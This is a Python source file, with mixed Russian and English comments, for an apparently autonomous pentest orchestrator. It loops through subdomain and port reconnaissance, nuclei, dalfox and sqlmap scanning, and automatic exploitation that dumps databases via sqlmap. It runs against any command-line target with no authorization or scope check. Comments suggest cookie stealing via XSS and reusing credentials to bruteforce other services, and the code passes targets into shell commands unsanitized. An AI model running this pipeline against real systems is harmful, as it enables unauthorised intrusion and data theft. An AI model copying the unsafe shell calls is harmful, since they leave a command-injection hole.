"""
AUTONOMOUS ORCHESTRATOR для REX35
Китайский уровень:
- Цикл: Scan → Analyze → Exploit → Pivot → Repeat
- Параллельные задачи
- Persistent memory
- Автоматические решения
"""
import asyncio, concurrent.futures, time, json
from pathlib import Path
from typing import Dict, List, Any
from pentest_db import PentestDB
from payload_generator import PayloadGenerator

class AutonomousOrchestrator:
    def __init__(self, workspace: Path, db_path: Path):
        self.workspace = workspace
        self.db = PentestDB(db_path)
        self.payload_gen = PayloadGenerator()
        
        self.state = {
            "current_phase": "idle",
            "completed_phases": [],
            "target_id": None,
            "findings": [],
            "exploited": [],
            "pivot_targets": []
        }
        
        self.cycle_count = 0
        self.max_cycles = 3  # Максимум циклов before stopping
    
    async def execute_autonomous_scan(self, target: str) -> Dict:
        """
        АВТОНОМНОЕ СКАНИРОВАНИЕ
        1. Init → 2. Recon → 3. Scan → 4. Exploit → 5. Pivot → REPEAT
        """
        print(f"\n{'='*70}")
        print(f"🔥 AUTONOMOUS PENTEST - CHINESE AGENT LEVEL")
        print(f"Target: {target}")
        print(f"{'='*70}\n")
        
        start_time = time.time()
        
        # PHASE 0: INITIALIZATION
        target_id = self.db.add_target(target, "Autonomous scan initiated")
        self.state["target_id"] = target_id
        
        # START MAIN LOOP
        while self.cycle_count < self.max_cycles:
            self.cycle_count += 1
            print(f"\n{'━'*70}")
            print(f"🔄 CYCLE {self.cycle_count}/{self.max_cycles}")
            print(f"{'━'*70}\n")
            
            # PHASE 1: RECONNAISSANCE
            await self.phase_recon(target)
            
            # PHASE 2: VULNERABILITY SCANNING (parallel)
            await self.phase_vuln_scan()
            
            # PHASE 3: EXPLOITATION (automated)
            await self.phase_exploit()
            
            # PHASE 4: PIVOT (if credentials/access gained)
            pivot_targets = await self.phase_pivot()
            
            # Если нашли новые targets → продолжаем цикл
            if not pivot_targets:
                print("\n✓ No new pivot targets found. Ending cycle.")
                break
            
            # Add pivot targets для следующего цикла
            for pt in pivot_targets:
                if pt not in self.state["pivot_targets"]:
                    self.state["pivot_targets"].append(pt)
        
        # FINALIZE
        duration = int(time.time() - start_time)
        stats = self.db.get_target_stats(target_id)
        
        print(f"\n{'='*70}")
        print(f"✅ AUTONOMOUS PENTEST COMPLETE")
        print(f"Duration: {duration}s")
        print(f"Cycles completed: {self.cycle_count}")
        print(f"Statistics:")
        print(f"  - Subdomains: {stats['subdomains']['total']} (live: {stats['subdomains']['live']})")
        print(f"  - Endpoints: {stats['endpoints']}")
        print(f"  - Vulnerabilities: {stats['vulnerabilities']}")
        print(f"  - Credentials: {stats['credentials']}")
        print(f"  - Exploit chains: {stats['exploit_chains']}")
        print(f"{'='*70}\n")
        
        return {
            "target": target,
            "duration": duration,
            "cycles": self.cycle_count,
            "stats": stats,
            "findings": self.state["findings"],
            "exploited": self.state["exploited"]
        }
    
    async def phase_recon(self, target: str):
        """
        RECONNAISSANCE PHASE
        Parallel execution:
        - Subdomain enumeration (subfinder + amass)
        - Live host detection (httpx)
        - Endpoint crawling (katana + gau + paramspider)
        - Port scanning (rustscan + masscan)
        """
        print(f"[PHASE 1] 🔍 RECONNAISSANCE")
        self.state["current_phase"] = "recon"
        
        scan_id = self.db.start_scan(self.state["target_id"], "reconnaissance")
        
        try:
            # Параллельный запуск всех recon tasks
            tasks = [
                self.task_subdomain_enum(target),
                self.task_endpoint_discovery(target),
                self.task_port_scan(target)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            subdomains = results[0] if not isinstance(results[0], Exception) else []
            endpoints = results[1] if not isinstance(results[1], Exception) else []
            ports = results[2] if not isinstance(results[2], Exception) else []
            
            # Save to DB
            if subdomains:
                self.db.add_subdomains(self.state["target_id"], subdomains)
            
            findings_count = len(subdomains) + len(endpoints) + len(ports)
            self.db.finish_scan(scan_id, findings_count)
            
            print(f"✓ Recon complete: {len(subdomains)} subdomains, {len(endpoints)} endpoints, {len(ports)} ports")
            
        except Exception as e:
            print(f"✗ Recon failed: {e}")
            self.db.finish_scan(scan_id, error_log=str(e))
    
    async def task_subdomain_enum(self, target: str) -> List[Dict]:
        """Subdomain enumeration (subfinder + amass parallel)"""
        print("  → Running subfinder + amass...")
        
        loop = asyncio.get_event_loop()
        
        # Run both in parallel
        with concurrent.futures.ThreadPoolExecutor() as pool:
            subfinder_future = loop.run_in_executor(pool, self._run_subfinder, target)
            amass_future = loop.run_in_executor(pool, self._run_amass, target)
            
            subfinder_subs = await subfinder_future
            amass_subs = await amass_future
        
        # Merge and dedupe
        all_subs = list(set(subfinder_subs + amass_subs))
        
        # Check live hosts
        live_hosts = await self._check_live_hosts(all_subs)
        
        return live_hosts
    
    def _run_subfinder(self, target: str) -> List[str]:
        """Run subfinder"""
        import subprocess
        try:
            result = subprocess.run(
                f"subfinder -d {target} -silent -timeout 60",
                shell=True, capture_output=True, text=True, timeout=90
            )
            return [s.strip() for s in result.stdout.split('\n') if s.strip()]
        except:
            return []
    
    def _run_amass(self, target: str) -> List[str]:
        """Run amass (passive only для скорости)"""
        import subprocess
        try:
            result = subprocess.run(
                f"amass enum -passive -d {target} -timeout 5",
                shell=True, capture_output=True, text=True, timeout=180
            )
            return [s.strip() for s in result.stdout.split('\n') if s.strip()]
        except:
            return []
    
    async def _check_live_hosts(self, subdomains: List[str]) -> List[Dict]:
        """Check live hosts via httpx"""
        if not subdomains:
            return []
        
        # Save to temp file
        temp_file = self.workspace / "temp_subs.txt"
        with open(temp_file, 'w') as f:
            f.write('\n'.join(subdomains))
        
        loop = asyncio.get_event_loop()
        
        def run_httpx():
            import subprocess, json
            try:
                result = subprocess.run(
                    f"httpx -l {temp_file} -silent -json -tech-detect -timeout 30 -threads 50",
                    shell=True, capture_output=True, text=True, timeout=120
                )
                
                live = []
                for line in result.stdout.split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            live.append({
                                "domain": data.get("host", ""),
                                "url": data.get("url", ""),
                                "status_code": data.get("status_code"),
                                "tech": data.get("tech", []),
                                "is_live": True
                            })
                        except:
                            pass
                return live
            except:
                return []
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            live_hosts = await loop.run_in_executor(pool, run_httpx)
        
        return live_hosts
    
    async def task_endpoint_discovery(self, target: str) -> List[str]:
        """Endpoint discovery (katana + gau + paramspider)"""
        print("  → Running katana + gau + paramspider...")
        
        loop = asyncio.get_event_loop()
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            katana_future = loop.run_in_executor(pool, self._run_katana, target)
            gau_future = loop.run_in_executor(pool, self._run_gau, target)
            
            katana_endpoints = await katana_future
            gau_endpoints = await gau_future
        
        all_endpoints = list(set(katana_endpoints + gau_endpoints))
        return all_endpoints[:500]  # Limit to 500
    
    def _run_katana(self, target: str) -> List[str]:
        """Run katana crawler"""
        import subprocess
        try:
            result = subprocess.run(
                f"katana -u https://{target} -d 3 -jc -silent -timeout 60",
                shell=True, capture_output=True, text=True, timeout=90
            )
            return [u.strip() for u in result.stdout.split('\n') if u.strip()]
        except:
            return []
    
    def _run_gau(self, target: str) -> List[str]:
        """Run gau (wayback machine)"""
        import subprocess
        try:
            result = subprocess.run(
                f"gau {target} --threads 5 --timeout 30",
                shell=True, capture_output=True, text=True, timeout=60
            )
            return [u.strip() for u in result.stdout.split('\n') if u.strip()][:200]
        except:
            return []
    
    async def task_port_scan(self, target: str) -> List[Dict]:
        """Port scanning (rustscan > nmap)"""
        print("  → Running rustscan...")
        
        loop = asyncio.get_event_loop()
        
        def run_rustscan():
            import subprocess, re
            try:
                # rustscan быстро находит открытые порты
                result = subprocess.run(
                    f"rustscan -a {target} --ulimit 5000 --timeout 1000 -- -sV",
                    shell=True, capture_output=True, text=True, timeout=120
                )
                
                ports = []
                for line in result.stdout.split('\n'):
                    match = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
                    if match:
                        ports.append({
                            "port": int(match.group(1)),
                            "service": match.group(2)
                        })
                return ports
            except:
                return []
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            ports = await loop.run_in_executor(pool, run_rustscan)
        
        return ports
    
    async def phase_vuln_scan(self):
        """
        VULNERABILITY SCANNING PHASE
        Parallel execution:
        - nuclei (all templates)
        - dalfox (XSS на всех endpoints)
        - arjun (hidden parameters)
        - SQL injection detection
        """
        print(f"\n[PHASE 2] 🔎 VULNERABILITY SCANNING")
        self.state["current_phase"] = "vuln_scan"
        
        scan_id = self.db.start_scan(self.state["target_id"], "vulnerability_scan")
        
        try:
            live_hosts = self.db.get_live_hosts(self.state["target_id"])
            if not live_hosts:
                print("✗ No live hosts to scan")
                return
            
            # Берём первые 5 live hosts
            targets = [h["url"] or h["subdomain"] for h in live_hosts[:5]]
            
            tasks = [
                self.task_nuclei_scan(targets),
                self.task_xss_scan(targets),
                self.task_sqli_scan(targets)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Aggregate all vulns
            all_vulns = []
            for r in results:
                if not isinstance(r, Exception) and isinstance(r, list):
                    all_vulns.extend(r)
            
            # Save to DB
            for vuln in all_vulns:
                vuln["target_id"] = self.state["target_id"]
                self.db.add_vulnerability(vuln)
            
            self.state["findings"].extend(all_vulns)
            self.db.finish_scan(scan_id, len(all_vulns))
            
            print(f"✓ Vuln scan complete: {len(all_vulns)} vulnerabilities found")
            
        except Exception as e:
            print(f"✗ Vuln scan failed: {e}")
            self.db.finish_scan(scan_id, error_log=str(e))
    
    async def task_nuclei_scan(self, targets: List[str]) -> List[Dict]:
        """Nuclei scan (parallel)"""
        print("  → Running nuclei...")
        
        loop = asyncio.get_event_loop()
        
        def run_nuclei():
            import subprocess, json
            vulns = []
            
            for target in targets[:3]:  # Limit to 3 targets
                try:
                    result = subprocess.run(
                        f"nuclei -u {target} -silent -json -severity critical,high -timeout 60",
                        shell=True, capture_output=True, text=True, timeout=90
                    )
                    
                    for line in result.stdout.split('\n'):
                        if line.strip():
                            try:
                                data = json.loads(line)
                                vulns.append({
                                    "vuln_type": data.get("template-id", "unknown"),
                                    "severity": data.get("info", {}).get("severity", "unknown"),
                                    "title": data.get("info", {}).get("name", ""),
                                    "description": data.get("info", {}).get("description", ""),
                                    "proof_of_concept": data.get("matched-at", ""),
                                    "confirmed": True
                                })
                            except:
                                pass
                except:
                    pass
            
            return vulns
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            vulns = await loop.run_in_executor(pool, run_nuclei)
        
        return vulns
    
    async def task_xss_scan(self, targets: List[str]) -> List[Dict]:
        """XSS scanning via dalfox"""
        print("  → Running dalfox (XSS scanner)...")
        
        loop = asyncio.get_event_loop()
        
        def run_dalfox():
            import subprocess
            vulns = []
            
            for target in targets[:5]:
                try:
                    result = subprocess.run(
                        f"dalfox url {target} --silence --no-color --only-poc",
                        shell=True, capture_output=True, text=True, timeout=60
                    )
                    
                    if "POC" in result.stdout or "XSS" in result.stdout:
                        vulns.append({
                            "vuln_type": "xss",
                            "severity": "high",
                            "title": f"XSS found at {target}",
                            "proof_of_concept": result.stdout[:500],
                            "confirmed": True
                        })
                except:
                    pass
            
            return vulns
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            vulns = await loop.run_in_executor(pool, run_dalfox)
        
        return vulns
    
    async def task_sqli_scan(self, targets: List[str]) -> List[Dict]:
        """SQLi scanning via sqlmap"""
        print("  → Running sqlmap (SQL injection)...")
        
        loop = asyncio.get_event_loop()
        
        def run_sqlmap():
            import subprocess
            vulns = []
            
            for target in targets[:3]:
                try:
                    result = subprocess.run(
                        f"sqlmap -u '{target}' --batch --smart --level 2 --risk 2 --threads 5 --timeout 30",
                        shell=True, capture_output=True, text=True, timeout=90
                    )
                    
                    if "sqlmap identified" in result.stdout.lower() or "injectable" in result.stdout.lower():
                        vulns.append({
                            "vuln_type": "sqli",
                            "severity": "critical",
                            "title": f"SQL injection at {target}",
                            "proof_of_concept": result.stdout[:500],
                            "confirmed": True
                        })
                except:
                    pass
            
            return vulns
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            vulns = await loop.run_in_executor(pool, run_sqlmap)
        
        return vulns
    
    async def phase_exploit(self):
        """
        EXPLOITATION PHASE
        Автоматическая эксплуатация найденных уязвимостей
        """
        print(f"\n[PHASE 3] 💥 EXPLOITATION")
        self.state["current_phase"] = "exploit"
        
        vulns = self.db.get_critical_vulns(self.state["target_id"])
        
        if not vulns:
            print("✗ No critical vulnerabilities to exploit")
            return
        
        print(f"  Found {len(vulns)} critical/high vulnerabilities")
        
        for vuln in vulns[:10]:  # Exploit top 10
            if vuln["vuln_type"] == "sqli":
                success = await self.exploit_sqli(vuln)
                if success:
                    self.db.mark_exploited(vuln["id"])
                    self.state["exploited"].append(vuln)
            
            elif vuln["vuln_type"] == "xss":
                # XSS можно использовать для cookie stealing
                print(f"  → XSS confirmed at {vuln.get('proof_of_concept', '')[:50]}")
        
        print(f"✓ Exploitation complete: {len(self.state['exploited'])} vulns exploited")
    
    async def exploit_sqli(self, vuln: Dict) -> bool:
        """Exploit SQL injection"""
        print(f"  → Attempting SQLi exploit...")
        
        # Попытка извлечь данные
        loop = asyncio.get_event_loop()
        
        def run_sqli_dump():
            import subprocess
            try:
                # Dump database
                result = subprocess.run(
                    f"sqlmap -u '{vuln.get('proof_of_concept')}' --batch --dump --threads 5 --timeout 60",
                    shell=True, capture_output=True, text=True, timeout=120
                )
                
                if "dumped" in result.stdout.lower():
                    return True
            except:
                pass
            return False
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            success = await loop.run_in_executor(pool, run_sqli_dump)
        
        return success
    
    async def phase_pivot(self) -> List[str]:
        """
        PIVOT PHASE
        Поиск новых targets на основе:
        - Извлечённых credentials
        - Внутренних IP в responses
        - Связанных доменов
        """
        print(f"\n[PHASE 4] 🔄 PIVOT & LATERAL MOVEMENT")
        self.state["current_phase"] = "pivot"
        
        pivot_targets = []
        
        # Check for credentials
        creds = self.db.get_credentials(self.state["target_id"])
        if creds:
            print(f"  → Found {len(creds)} credentials")
            # Можно использовать для bruteforce других сервисов
        
        # Check for internal IPs in findings
        # TODO: parse responses для internal IPs
        
        # Check for related domains from SSL certs
        # TODO: parse SSL certs
        
        return pivot_targets
    
    def cleanup(self):
        """Cleanup resources"""
        self.db.close()


# Alias so agents/__init__.py can do: from .orchestrator import Orchestrator
Orchestrator = AutonomousOrchestrator


# ━━━ CLI ENTRY POINT ━━━
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python autonomous_orchestrator.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    workspace = Path("./workspace")
    db_path = workspace / "pentest.db"
    
    workspace.mkdir(exist_ok=True)
    
    orchestrator = AutonomousOrchestrator(workspace, db_path)
    
    try:
        result = asyncio.run(orchestrator.execute_autonomous_scan(target))
        print("\n✅ SCAN COMPLETE")
        print(json.dumps(result, indent=2))
    finally:
        orchestrator.cleanup()
